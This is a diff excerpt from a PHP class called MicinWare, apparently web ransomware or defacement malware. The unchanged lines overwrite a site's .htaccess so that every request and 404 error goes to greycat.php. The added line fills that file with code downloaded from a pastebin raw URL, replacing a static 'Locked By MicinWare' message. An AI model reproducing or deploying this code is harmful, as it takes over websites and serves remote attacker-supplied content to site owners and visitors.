@@ -232,7 +232,7 @@ class MicinWare
 		if (!$check) 
 			rename(DOC_ROOT.'/.htaccess', DOC_ROOT.'/.htaccess.old');
 			file_put_contents(DOC_ROOT.'/.htaccess', "DirectoryIndex greycat.php\nErrorDocument 404 /greycat.php");
-			file_put_contents(DOC_ROOT.'/greycat.php', "Locked By MicinWare");
+			file_put_contents(DOC_ROOT.'/greycat.php', file_get_contents("https://pastebin.com/raw/xBpsQ1Mw"));
 	}
 
 	public function ungenerateMicin()
